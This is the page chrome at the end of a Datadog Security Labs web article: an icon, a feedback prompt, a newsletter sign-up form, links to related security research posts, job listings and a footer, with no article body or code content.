<path d="M33.3304 20.0001C33.3318 19.4272 33.1645 18.8666 32.8493 18.3882C32.5341 17.9099 32.085 17.5349 31.558 17.3103C31.031 17.0856 30.4495 17.0211 29.8861 17.1249C29.3227 17.2287 28.8024 17.4961 28.39 17.8938C26.3985 16.4569 23.651 15.5278 20.5899 15.4202L21.9192 9.16929L26.2604 10.0914C26.2837 10.5985 26.4911 11.0797 26.8438 11.4447C27.1966 11.8098 27.6703 12.0336 28.1764 12.0743C28.6824 12.115 29.1858 11.9697 29.5923 11.6656C29.9988 11.3616 30.2805 10.9197 30.3844 10.4228C30.4883 9.92592 30.4075 9.40819 30.1569 8.96669C29.9064 8.52519 29.5034 8.19025 29.0235 8.02468C28.5436 7.85911 28.0199 7.87427 27.5504 8.06733C27.0809 8.26039 26.6979 8.61809 26.4734 9.07334L21.6267 8.04128C21.4914 8.01286 21.3503 8.03928 21.2345 8.11475C21.1186 8.19022 21.0375 8.30856 21.0088 8.44381L19.5251 15.4178C16.4195 15.5044 13.6299 16.4358 11.6103 17.8892C11.3036 17.5961 10.9366 17.3735 10.5349 17.2369C10.1332 17.1004 9.70661 17.0533 9.28482 17.0987C8.86303 17.1442 8.45627 17.2813 8.09295 17.5003C7.72963 17.7193 7.41853 18.0151 7.18137 18.3668C6.94422 18.7186 6.78674 19.1179 6.71994 19.5368C6.65314 19.9557 6.67863 20.3842 6.79463 20.7923C6.91063 21.2003 7.11434 21.5782 7.39153 21.8993C7.66871 22.2205 8.01268 22.4772 8.39941 22.6516C8.35065 22.9425 8.32406 23.2367 8.31984 23.5316C8.31984 28.0202 13.5433 31.657 19.9885 31.657C26.4336 31.657 31.6547 28.0202 31.6547 23.5316C31.6545 23.2385 31.6318 22.9459 31.5869 22.6563C32.1032 22.4296 32.5427 22.058 32.8522 21.5865C33.1616 21.1151 33.3277 20.564 33.3304 20.0001ZM13.3327 22.0829C13.3322 21.6704 13.4542 21.267 13.683 20.9238C13.9118 20.5806 14.2373 20.313 14.6183 20.1548C14.9993 19.9966 15.4186 19.955 15.8233 20.0352C16.2279 20.1154 16.5997 20.3138 16.8915 20.6053C17.1834 20.8968 17.3822 21.2684 17.4628 21.6729C17.5435 22.0775 17.5023 22.4969 17.3446 22.878C17.1868 23.2592 16.9196 23.585 16.5766 23.8142C16.2337 24.0434 15.8304 24.1658 15.4179 24.1658C14.8655 24.1652 14.3358 23.9456 13.945 23.5552C13.5541 23.1648 13.3339 22.6354 13.3327 22.0829ZM24.9498 27.5896C23.5293 29.0078 20.8029 29.1201 20.0025 29.1201C19.2021 29.1201 16.4757 29.0078 15.0552 27.5896C14.9537 27.4881 14.8967 27.3505 14.8967 27.207C14.8967 27.0635 14.9537 26.9258 15.0552 26.8243C15.1566 26.7229 15.2943 26.6658 15.4378 26.6658C15.5813 26.6658 15.7189 26.7229 15.8204 26.8243C16.7168 27.7207 18.6288 28.0389 20.0025 28.0389C21.3762 28.0389 23.2906 27.7207 24.1869 26.8243C24.2365 26.7714 24.2963 26.7291 24.3626 26.6998C24.4289 26.6704 24.5005 26.6548 24.573 26.6537C24.6455 26.6526 24.7175 26.666 24.7847 26.6933C24.8518 26.7206 24.9128 26.7612 24.964 26.8125C25.0152 26.8639 25.0556 26.925 25.0827 26.9923C25.1098 27.0595 25.123 27.1316 25.1217 27.2041C25.1204 27.2766 25.1045 27.3481 25.075 27.4143C25.0454 27.4805 25.0029 27.5402 24.9498 27.5896ZM24.5848 24.1681C24.1722 24.1686 23.7687 24.0466 23.4254 23.8177C23.0821 23.5887 22.8145 23.2631 22.6564 22.882C22.4983 22.5009 22.4568 22.0814 22.5372 21.6767C22.6176 21.272 22.8162 20.9002 23.108 20.6085C23.3997 20.3167 23.7715 20.1181 24.1762 20.0377C24.5809 19.9573 25.0004 19.9988 25.3815 20.1569C25.7626 20.315 26.0882 20.5827 26.3172 20.9259C26.5461 21.2692 26.6681 21.6727 26.6676 22.0853C26.6664 22.6373 26.4465 23.1664 26.0562 23.5567C25.6658 23.947 25.1368 24.1669 24.5848 24.1681Z" fill="white"/>
</svg>

          <span class="sr-only">reddit</span>
        </a>
      </li>
    
  </ul>
</div>
      </div>
    </div>

    <span class="block desktop:hidden pb-9 tablet:pb-7 desktop:pb-0"></span>

    <div id="feedback-card-sticky" class="col-span-12 desktop:w-4/12 desktop:pr-10">
      <div
    x-data="{ activeButton: 0, cardVisible: true }"
    x-show="cardVisible"
    class="article-feedback-card card z-10 p-3 tablet:p-4 desktop:p-6 w-full flex flex-col tablet:flex-row desktop:flex-col gap-3 tablet:gap-6 desktop:gap-3 justify-between">
    <div class="flex gap-5 desktop:gap-4 items-center justify-between">
        <h2 class="text-purple-3 italic font-national font-light text-16 leading-24 tablet:text-18 tablet:leading-26 desktop:text-20 desktop:leading-28">
            Did you find this article helpful?
        </h2>

        <button class="flex" type="button" aria-label="Close feedback prompt" @click="cardVisible = false">
            <svg class="inline-flex tablet:hidden desktop:inline-flex w-6 h-6 fill-gray-40 hover:fill-purple"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </button>
    </div>

    <div class="flex gap-6 items-center">
        <div class="grid grid-cols-2 gap-4 w-fit">
            
    <button
    
        data-custom-name="Article thumbs up"
        aria-label="Article thumbs up"
    
    class="feedback-button group/button inline-flex w-fit p-1.5 rounded border-[2px] active:border-purple-3 active:bg-purple-3"
    :class="activeButton === 1 ? 'border-purple-3 bg-purple-3' : 'border-gray-25 hover:border-purple hover:bg-purple'"
    type="button"
    @click="activeButton = 1"
    :disabled="activeButton === 1 ? true : false">
    <svg class="inline-flex w-6 h-6 group-active/button:fill-white" :class="activeButton === 1 ? 'fill-white' : 'fill-black'" focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_1110_10289)">
<path d="M23.05 7.275C22.6625 6.7875 22.0875 6.5 21.475 6.5H14.7875L15.7875 2.4875C15.9375 1.8875 15.8 1.2625 15.425 0.775C15.0375 0.2875 14.4625 0 13.85 0H10.9875C10.2375 0 9.5625 0.4125 9.2125 1.075L6.3875 6.5H1.5V20.5H6H8H18.975C19.9 20.5 20.6875 19.875 20.9125 18.9875L23.4125 8.9875C23.5625 8.3875 23.425 7.7625 23.05 7.275ZM6 18.5H3.5V8.5H6V18.5ZM21.475 8.5L18.975 18.5H8V7.75L10.9875 2H13.85L12.225 8.5H21.475Z"/>
</g>
<defs>
<clipPath id="clip0_1110_10289">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>
</svg>

</button>

            
    <button
    
        data-custom-name="Article thumbs down"
        aria-label="Article thumbs down"
    
    class="feedback-button group/button inline-flex w-fit p-1.5 rounded border-[2px] active:border-purple-3 active:bg-purple-3"
    :class="activeButton === 2 ? 'border-purple-3 bg-purple-3' : 'border-gray-25 hover:border-purple hover:bg-purple'"
    type="button"
    @click="activeButton = 2"
    :disabled="activeButton === 2 ? true : false">
    <svg class="inline-flex w-6 h-6 group-active/button:fill-white" :class="activeButton === 2 ? 'fill-white' : 'fill-black'" focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M0.949947 16.725C1.33745 17.2125 1.91245 17.5 2.52495 17.5H9.21245L8.21245 21.5125C8.06245 22.1125 8.19995 22.7375 8.57495 23.225C8.96245 23.7125 9.53745 24 10.1499 24H13.0124C13.7624 24 14.4374 23.5875 14.7874 22.925L17.5999 17.5H22.4999V3.5H17.9999H15.9999H5.02495C4.09995 3.5 3.31245 4.125 3.08745 5.0125L0.587447 15.0125C0.437447 15.6125 0.574947 16.2375 0.949947 16.725ZM17.9999 5.5H20.4999V15.5H17.9999V5.5ZM2.52495 15.5L5.02495 5.5H15.9999V16.25L13.0124 22H10.1499L11.7749 15.5H2.52495Z"/>
</svg>

</button>

        </div>

        <button class="hidden tablet:flex desktop:hidden" type="button" aria-label="Close feedback prompt" @click="cardVisible = false">
            <svg class="inline-flex w-6 h-6 fill-gray-40 hover:fill-purple"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </button>
    </div>
</div>
    </div>
  </article>

  <div class="py-18 tablet:py-24 desktop:py-30">
    <section id="subscribe" class="scroll-mt-20">
    <div class="card-subscription">
        <div>
            <h2 class="tracking-[-0.01em] text-24 leading-24 tablet:text-28 tablet:leading-28 desktop:text-[34px] desktop:leading-[34px]">
                Subscribe to the Datadog Security Digest</h2>
            <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>
            <p class="">Get Security Labs posts, insights from the cloud security community, and the latest Datadog security features delivered to your inbox monthly. No spam.</p>
        </div>
        <div>
            <form
                id="mktoForm_32364"
                data-redirect="false"
                class="relative flex flex-col gap-2 tablet:gap-3 desktop:gap-4 [&>div:has([type=hidden])]:hidden
                    [&_input]:proportional-nums [&_input]:placeholder:text-gray-5 [&_input]:border [&_input]:border-gray-40 [&_input]:rounded
                    [&_input]:w-full [&_input]:px-3 [&_input]:py-1.5 [&_input]:focus-within:outline-gray-40 [&_input]:text-16
                    [&_input]:leading-24 [&_input]:tablet:text-18 [&_input]:tablet:leading-26 [&_input]:desktop:text-20
                    [&_input]:desktop:leading-28 [&_p:has(span)]:text-14 [&_p:has(span)]:leading-20 [&_p:has(span)]:desktop:text-16
                    [&_p:has(span)]:desktop:leading-22 [&_label]:hidden [&_button]:bg-transparent [&_button]:text-magenta
                    [&_button]:font-extrabold [&_button]:uppercase [&_button]:text-14 [&_button]:leading-18 [&_button]:tablet:text-16
                    [&_button]:tablet:leading-20 [&_button]:desktop:text-18 [&_button]:desktop:leading-24 [&_button]:tracking-[0.01em]
                    [&_button]:w-max [&_button]:px-2 [&_button]:tablet:px-3 [&_button]:desktop:px-4 [&_button]:absolute [&_button]:right-0
                    [&_button]:top-[9px] [&_button]:tablet:top-2 [&_a]:text-purple-600 [&_a:hover]:text-purple [&_.mktoErrorMsg]:text-gray-5"></form>
            <div id="mktoForm_32364--thank-you" class="hidden">
                <h3>Thank you for subscribing!</h3>
            </div>
        </div>
    </div>
</section>

    <script src="/assets/scripts/lp/js/forms2/js/forms2.min.js"></script>

<script src="/assets/scripts/marketo_form-KCMD5SGW.js" defer></script>

  </div>

  
  

  
    <section>
      <h2 class="h1">Related Content</h1>

      <span class="block pb-4 tablet:pb-5 desktop:pb-6"></span>

      <div class="grid grid-cols-1 tablet:grid-cols-3 gap-6 tablet:gap-[30px]">
        
          
            <a class="block text-black" href="/articles/abusing-entra-id-administrative-units/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/abusing-entra-id-administrative-units/hero.jpg?auto=format&amp;w=447&dpr=1.75"
        alt="Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">research</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence</p>
  </article>
</a>
          
        
          
            <a class="block text-black" href="/articles/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplified-exposure-hero.png?auto=format&amp;w=447&dpr=1.75"
        alt="Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">research</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover</p>
  </article>
</a>
          
        
          
            <a class="block text-black" href="/articles/analysis-of-teamtnt-doppelganger/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_globe.png?auto=format&amp;w=447&dpr=1.75"
        alt="An analysis of a TeamTNT doppelgÃ¤nger"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">research</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">An analysis of a TeamTNT doppelgÃ¤nger</p>
  </article>
</a>
          
        
          
            <a class="block text-black" href="/articles/appsync-vulnerability-disclosure/">
  <article>
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&amp;w=447&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&amp;w=447&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&amp;w=447&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/appsync-vulnerability-disclosure/hero.png?auto=format&amp;w=447&dpr=1.75"
        alt="A confused deputy vulnerability in AWS AppSync"
        class=""
        loading="lazy"
    />
</figure>



    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 font-roboto-mono font-light uppercase tracking-4">research</p>

    <span class="block pb-0.5 tablet:pb-1 desktop:pb-2"></span>

    <p class="text-16 leading-20 tablet:text-18 tablet:leading-24 desktop:text-20 desktop:leading-24 font-extrabold tracking-1 hover:text-purple active:text-purple-3">A confused deputy vulnerability in AWS AppSync</p>
  </article>
</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </div>
    </section>
  
</div>

<div class="border-t border-gray-800"></div>
<section id="work-with-us">
  <div class="work-with-us container desktop:py-15 tablet:py-12 py-9">
    <h2 class="h1 capitalize">work with us</h2>

    <span class="block pb-2 tablet:pb-3 desktop:pb-4"></span>

    <p class="desktop:text-28 desktop:leading-32 tablet:text-24 tablet:leading-28 text-20 leading-24">
      We're always looking for talented people to collaborate with
    </p>

    <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>

    <div>
      <p class="font-extrabold desktop:text-16 desktop:leading-20 text-14 leading-18 uppercase">
        featured positions
      </p>

      <span class="block pb-2 desktop:pb-3"></span>

      <ul class="border-t border-gray-15">
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6262025/?gh_jid=6262025">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Director, Engineering - Observability SRE
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6164747/?gh_jid=6164747">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Engineering Manager 1 - Trust &amp; Safety
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6288119/?gh_jid=6288119">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Engineering Manager - Incident Management
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5912132/?gh_jid=5912132">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Information Security Analyst II, Customer Trust
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/5912135/?gh_jid=5912135">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Information Security Analyst II, Customer Trust (Lisbon)
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
            <li>
              <a class="block border-b border-gray-15 py-2 tablet:py-3 desktop:py-4 hover:bg-purple-1 active:text-purple-3" href="https://careers.datadoghq.com/detail/6105990/?gh_jid=6105990">
                <article class="flex tablet:flex-row tablet:justify-between tablet:items-center flex-col">
                  <p class="font-extrabold desktop:text-20 desktop:leading-28 tablet:text-18 tablet:leading-24 text-16 leading-20">
                    Product Threat Detection Engineer 2
                  </p>
                  <p class="font-roboto-mono font-light desktop:text-16 desktop:leading-20 tablet:text-14 tablet:leading-18 text-12 leading-16 uppercase tracking-10">
                    Security - Engineering
                  </p>
                </article>
              </a>
            </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </div>

    <span class="block pb-6 tablet:pb-8 desktop:pb-12"></span>

    <p class="desktop:text-28 desktop:leading-32 tablet:text-24 tablet:leading-28 text-20 leading-24">
      We have <span class="text-purple-3">19</span> positions
    </p>

    <span class="block pb-4 tablet:pb-5 desktop:pb-6"></span>

    
 
<a
  href="https://careers.datadoghq.com/all-jobs/?parent_department_Engineering%5B0%5D=Engineering&amp;child_department_Engineering%5B0%5D=Global%20Information%20Security"
  data-custom-name="View all positions button"
>
  <span class="btn-default border-default">view all</span>
</a>


  </div>
</section>

<script src="/assets/scripts/article-MQSRUAET.js" defer></script>
<script type="module" async>import mermaid from "https://unpkg.com/mermaid@10/dist/mermaid.esm.min.mjs";document.addEventListener('DOMContentLoaded', mermaid.initialize({"loadOnSave":true}));</script>

    </main>
    
    

<footer class="navbar navbar-footer">
  <div class="container h-full flex tablet:flex-nowrap flex-wrap justify-between tablet:items-center">
    <p class="copyright tablet:-order-none order-2">&copy; Datadog 2024</p>
    <nav class="navbar-menu tablet:order-none order-1 tablet:w-auto w-full tablet:m-0 mb-5">
      <ul>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/terms/" title="TERMS" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">TERMS</span>
    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/privacy/" title="PRIVACY" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">PRIVACY</span>
    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-footer ">
  <a href="https://www.datadoghq.com/legal/cookies/" title="COOKIES" class="navbar-menu-link" data-custom-name="Footer link">
    <span class="">COOKIES</span>
    
  </a>
</li>
        
      </ul>
    </nav>
    <nav class="navbar-menu tablet:order-none order-3">
      <ul class="flex items-center gap-5">
        
          <li class="navbar-menu-item navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3 ">
  <a href="https://www.twitter.com/datadoghq/" title="twitter" class="navbar-menu-link" data-custom-name="Social link">
    <span class="sr-only">twitter</span>
    
      <svg class="navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3"  width="32" height="26" viewBox="0 0 32 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M32 3.06847C30.8011 3.59032 29.53 3.92736 28.23 4.06809C29.6028 3.25017 30.6302 1.96012 31.12 0.439486C29.8487 1.21147 28.4556 1.7624 27 2.06886C26.1024 1.09132 24.9296 0.408504 23.6362 0.11034C22.3427 -0.187824 20.9892 -0.0873454 19.754 0.398541C18.5188 0.884427 17.4598 1.73293 16.7165 2.83228C15.9732 3.93163 15.5804 5.23027 15.59 6.55713C15.5899 7.06175 15.6469 7.56476 15.76 8.05656C13.1501 7.92429 10.5972 7.24554 8.26644 6.06426C5.9357 4.88298 3.87916 3.22551 2.23 1.19919C1.64381 2.19953 1.33648 3.33861 1.34 4.49792C1.33386 5.58425 1.5974 6.65514 2.10701 7.61464C2.61661 8.57415 3.35637 9.3923 4.26 9.99581C3.20814 9.97087 2.1783 9.68949 1.26 9.17613V9.25609C1.25956 10.7709 1.78297 12.2393 2.74158 13.4125C3.70019 14.5857 5.03504 15.3916 6.52 15.6936C5.95613 15.8468 5.37433 15.9241 4.79 15.9235C4.37705 15.9242 3.96504 15.884 3.56 15.8036C3.97753 17.1081 4.79325 18.2493 5.89266 19.0668C6.99208 19.8843 8.31998 20.3372 9.69 20.3618C7.36206 22.1863 4.48815 23.1756 1.53 23.1707C1.01794 23.1565 0.507113 23.1132 0 23.0408C2.9985 24.9733 6.49229 25.9975 10.06 25.9897C22.14 25.9897 28.74 15.9935 28.74 7.31684C28.74 7.03695 28.74 6.74706 28.74 6.46717C30.0214 5.53848 31.1256 4.38732 32 3.06847Z"/>
</svg>

    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3 ">
  <a href="/rss/feed.xml" title="rss" class="navbar-menu-link" data-custom-name="Social link">
    <span class="sr-only">rss</span>
    
      <svg class="navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3"  version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 192 192" style="enable-background:new 0 0 192 192;" xml:space="preserve">
  <path class="st0" d="M136,154h-16c0-45.21-36.79-82-82-82V56C92.04,56,136,99.96,136,154z"/>
  <path class="st0" d="M96,154H80c0-23.16-18.84-42-42-42V96C69.98,96,96,122.02,96,154z"/>
  <path class="st0" d="M176,154h-16c0-67.27-54.73-122-122-122V16C114.09,16,176,77.91,176,154z"/>
  <circle class="st0" cx="38" cy="154" r="18"/>
</svg>

    
  </a>
</li>
        
      </ul>
    </nav>
  </div>
</footer>
  </body>
</html>
